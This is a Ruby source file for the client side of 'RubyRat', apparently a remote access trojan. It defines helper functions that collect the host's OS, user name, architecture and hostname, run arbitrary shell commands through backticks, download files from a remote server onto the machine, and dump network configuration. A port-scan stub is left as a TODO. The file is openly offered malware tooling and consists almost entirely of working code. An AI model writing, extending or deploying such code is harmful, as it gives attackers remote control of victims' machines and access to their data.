##
#
# File containing all of the necessary functions for the client to work properly
#
##
require 'etc'
require 'core'
require 'net/http'

module RubyRat
  module Tools
    # Performs a port scan on a single host
    def self.scan_single_host(addr)
      true  # TODO
    end

    def getarch
      case RUBY_PLATFORM
        when /mswin|windows/i
          `wmic OS get OSArchitecture`.split("\n")[1]
        when /linux|arch/i
          `uname -m`
        when /sunos|solaris/i
          `uname -m`
        when /darwin/i
          `uname -m`
        else
          return ''
      end
    end

    def self.sysinfo
      results = {}
      results[:os]   = RUBY_PLATFORM
      results[:user] = Etc.getlogin
      results[:arch] = getarch
      results[:name] = Socket.gethostname
      table = Terminal::Table.new do |t|
        t << ['Client information', '']
        t << :separator
        t << ['OS', results[:os]]
        t << ['User', results[:user]]
        t << ['Architecture', results[:arch]]
        t << ['Computer name', results[:name]]
      end
      table.to_s
    end

    # This function isn't really needed but it's nice to keep things organizes
    def self.pwd
      Dir.pwd
    end

    # Same idea as above
    def self.pid
      #puts Process.pid
      Process.pid
    end

    def self.execute(cmd)
      `#{cmd}`
    end

    # Gets a file from a remote server
    def self.wget(addr)

      if addr.start_with? 'http'
          return "Error: URL cannot start with 'http(s)'"
      end

      parsed = addr.split('/')
      website = parsed[0]
      filepath = parsed[1..-1].join '/'
      filepath[0, 0] = '/'  # Prepend a slash
      filename = parsed[-1]
      
      begin
        Net::HTTP.start(website) do |http|
          resp = http.get(filepath)
          @file = File.new(filename, 'w')
          @file.write(resp.body)
          @file.close
        end
        return 'Download successful'
      rescue Exception => e
        return "Download failed: #{e.message}"
      end
    end

    def self.ifconfig(plat)
      return `ifconfig` if plat != 'win'
      `ipconfig /all`
    end

  end
end
